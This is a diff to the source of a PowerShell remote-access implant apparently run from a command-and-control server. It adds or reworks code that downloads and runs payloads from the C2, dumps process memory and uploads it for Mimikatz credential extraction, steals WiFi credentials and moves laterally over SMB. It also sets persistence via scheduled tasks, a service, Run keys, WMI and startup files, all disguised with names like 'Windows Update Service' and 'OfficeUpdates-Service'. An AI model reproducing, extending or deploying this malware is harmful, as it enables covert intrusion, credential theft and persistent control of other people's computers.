@@ -55,7 +55,7 @@ function Decrypt-String($key, $encryptedStringWithIV) {
 			$aesManaged.Dispose()
 			[System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 		}
-
+(New-Object System.Net.WebClient).AllowWriteStreamBuffering = $false
 ################## MAIN VARIABLES PREPARATION #########################         
 $c2cEncrypted = (New-Object System.Net.WebClient).DownloadString("GETC2URL") # Retreive good C2 URL and each execution
 [string] $Global:keyreadgetC2 = "KEYTOREADGETC2"
@@ -243,23 +243,30 @@ if ($pshversion -lt 3) {
 			[string] $url="$c2c/ROOT_FOLDER/exfil.php?pc=$pc";
 			$exfil = $http.UploadFile($url,$Path);
 			}
-		function zip{
+		function zip {
 			param( [string]$Source, [string]$destination )
 			If(Test-path $destination) {Remove-item $destination}
-			#Add-Type -assembly "system.io.compression.filesystem"
-			#[io.compression.zipfile]::CreateFromDirectory($Source, $destination)
-			if ($pshversion -gt 3) { Compress-Archive -path $Source -destinationpath $destination
+			if ($pshversion -lt 3) {
+				Add-Type -assembly "system.io.compression.filesystem"
+				[io.compression.zipfile]::CreateFromDirectory($Source, $destination)
+				}
+			if ($pshversion -gt 3) { 
+				Compress-Archive -path $Source -destinationpath $destination
 				Start-sleep -Seconds 5
 				}			
 			}	
 		function unzip {
 			param( [string]$ziparchive, [string]$extractpath)
 			If(Test-path $extractpath) {Remove-item $extractpath}
-			#Add-Type -AssemblyName System.IO.Compression.FileSystem
-			#[System.IO.Compression.ZipFile]::ExtractToDirectory( $ziparchive, $extractpath )
-			if ($pshversion -gt 3) { expand-archive -path $ziparchive -destinationpath $extractpath}			
+			if ($pshversion -lt 3) {
+				Add-Type -AssemblyName System.IO.Compression.FileSystem
+				[System.IO.Compression.ZipFile]::ExtractToDirectory( $ziparchive, $extractpath )
+				}
+			else ($pshversion -gt 3) { 
+				expand-archive -path $ziparchive -destinationpath $extractpath
+				}			
 			}
-		function Add-Zip{ #Get-Item D:\testfolder | Add-Zip D:\testzip.zip
+		function Add-Zip{ # Get-Item D:\testfolder | Add-Zip D:\testzip.zip
 			param([string]$zipfilename)
 			if(-not (test-path($zipfilename))){
 				set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
@@ -487,12 +494,9 @@ $r = $r + "---- PC Idle for " + $Idle.Days + " days, " + $Idle.Hours + " hours, 
             $WebResponse = $WebRequest.GetResponse()
             $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
             $WebResponse.Close()
-            $downloadedScript = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
+			(New-Object System.Net.WebClient).DownloadFile($downloadURL, $FileOnDisk)
 			#Convert txt to exe
 			Rename-Item $FileOnDisk help.exe
-			#[string]$hex = get-content -path $FileOnDisk
-			#[Byte[]] $temp = $hex -split ' '
-			#[System.IO.File]::WriteAllBytes("$env:userprofile\help.exe", $temp)
 			}
 		}
 		function persistAuto { # Actions for auto persistence
@@ -992,7 +996,7 @@ Exfilt "$env:userprofile\AppData\smbenum.txt"
             $WebResponse = $WebRequest.GetResponse()
             $ActualdownloadURL = $WebResponse.ResponseUri.AbsoluteUri
             $WebResponse.Close()
-            $downloadedImage = $WebClientObject.downloadFile($downloadURL,"$FileOnDisk")
+            $downloadedImage = (New-Object System.Net.WebClient).DownloadFile($downloadURL, $FileOnDisk)
             Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value $FileOnDisk
             [string] $CmdString = 'rundll32.exe user32.dll, UpdatePerUserSystemParameters'
             Invoke-Expression $CmdString
@@ -1426,13 +1430,17 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			Write-Host "ProcessDump 64.." -ForegroundColor DarkGreen
 			attrib +h "$env:userprofile\AppData\proc.exe"
 			}
-			$Command = "$env:userprofile\AppData\proc.exe -accepteula -ma $process $env:userprofile\AppData\procdump.dmp";
+			New-Item -Path "$env:userprofile\AppData" -Name "dump" -ItemType "directory"
+			$Command = "$env:userprofile\AppData\proc.exe -accepteula -ma $process $env:userprofile\AppData\dump\procdump.dmp";
 			RunJob -code $Command;
 			Start-Sleep -Seconds 60
-			exfiltrate $env:userprofile\AppData\procdump.dmp
-			[String] $result += Get-ChildItem $env:userprofile\AppData\procdump.dmp
-			$result +="Open dump file with Mimikatz to retrieve the creds --> mimikatz # sekurlsa::minidump procdump.dmp  AND >mimikatz # sekurlsa::logonPasswords"
+			$dumpfile = hostname
+			zip "$env:userprofile\AppData\dump" "$env:userprofile\AppData\$dumpfile.zip"
+			Start-Sleep -Seconds 7
+			exfiltrate "$env:userprofile\AppData\$dumpfile.zip"
+			$result +="$dumpfile.zip -Open dump file with Mimikatz to retrieve the creds --> mimikatz # sekurlsa::minidump procdump.dmp  AND >mimikatz # sekurlsa::logonPasswords"
 			sendC2 $pc $result $id;
+			Remove-Item "$env:userprofile\AppData\dump"
 		   }		   
 		Function WifiCredsCommand { # !wificreds|SSID_NAME - Extract stored WIFI credentials
 			[CmdletBinding()] param( 
@@ -1603,45 +1611,35 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 				$payload = $myOwnPayload
 				}
 			else {
-				$payload = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exe bypass -nol -win hidden -enc myAgntencoded"
+				$payload = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exe bypass  -NoL -Non -win hidden -enc $myAgntencoded"
 				}		
 			[string]$result = "PERSITENCE ---"
 			function persistTask {
-				$pa = @"
-powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pnt.ps1"))
-"@
-				$r1 = schtasks /create /tn OfficeUpdates-Service /tr "$pa" /sc onidle /i 30
-				$r2 = schtasks /create /tn GoogleUpdates-us /tr "$pa" /sc onlogon /ru System
-				$r3 = schtasks /create /tn SkypeUpdates-en /tr "$pa" /sc onstart /ru System
+#				$pa = @"
+#powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/pnt.ps1"))
+#"@
+				$r1 = schtasks /create /tn OfficeUpdates-Service /tr "$payload" /sc onidle /i 30
+				$r2 = schtasks /create /tn GoogleUpdates-us /tr "$payload" /sc onlogon /ru System
+				$r3 = schtasks /create /tn SkypeUpdates-en /tr "$payload" /sc onstart /ru System
 				$result += "$r1 - $r2 - $r3"
 				}
 			function persistService {
-				[string] $PersistencePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.lnk"
-				$WScript = New-Object -ComObject Wscript.Shell
-				$Shortcut = $Wscript.CreateShortcut($PersistencePath)
-				$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-                $Shortcut.Arguments =  "-Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
-				$Shortcut.IconLocation = "explorer.exe,23"
-				$Shortcut.Description = "Windows Criticals Updates shortcut"
-				$Shortcut.WindowStyle = 7
-				$Shortcut.Save()
-				$result += dir $PersistencePath
+				[string] $PersistencePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\wuausvc.bat"
+				set-content $PersistencePath -Value $payload
 				$result += New-Service -Name 'wuausvc' -displayName 'Windows Update Service' -BinaryPathName $PersistencePath -Description 'Enables Remediation and protection of Windows Update components (WUC)' -StartupType Automatic
 				}
 			function persistReg {
-				$Pathreg =  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Exec Bypass -NoL -Win Hidden -Enc $myAgntencoded"
 				$registryPath1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 				$registryPath2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
 				$name = "Release"
-				New-ItemProperty -Path $registryPath1 -Name $name -Value $Pathreg -PropertyType String -Force | Out-Null
-				New-ItemProperty -Path $registryPath2 -Name $name -Value $Pathreg -PropertyType String -Force | Out-Null
+				New-ItemProperty -Path $registryPath1 -Name $name -Value $payload -PropertyType String -Force | Out-Null
+				New-ItemProperty -Path $registryPath2 -Name $name -Value $payload -PropertyType String -Force | Out-Null
 				$result +="reg ready"
 				}
 			function persistWmi {
 				if ($IsAdmin -eq $True) {
-				$cmd_persist = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -nol -win hidden -enc $myAgntencoded" 
 				IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/wmipersist.txt"));
-				wmiPersistence $cmd_persist
+				wmiPersistence $payload
 				} else {$result += "Need shell with privileges - try privesc"}
 				}
 			function persistStartup {
@@ -1650,8 +1648,7 @@ powershell.exe -Win hidden -NoL -Non -ep bypass -nop -c IEX((New-Object Net.WebC
 				} else {
 				[string] $PersistencePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\explorer.bat"
 				}
-				echo "PowerShell -Exec Bypass -NoL -Win Hidden -Enc $encoded" > $PersistencePath	
-				$result += dir $PersistencePath
+				set-content $PersistencePath -Value $payload	
 				}
 			if ($method_persist -eq "task") {	
 				persistTask
@@ -1866,8 +1863,9 @@ Invoke-SMBExec -Target $TargetIp -Domain $DomainOrWorkgroup -Username $username 
 			)
 			$source = $LatestOrder.split('|')[1]
             $destination =  $LatestOrder.split('|')[2]
-			Compress-Archive -path $Source -destinationpath $destination
+			zip $Source $destination
 			Start-sleep -Seconds 5
+			$result= "ok"
 			sendC2 $pc $result $id
 		}		
 		Function ExfiltrateCommand { # !exfiltrate|C:\users    # Find files by extensions with a recursive search and compress the result. 
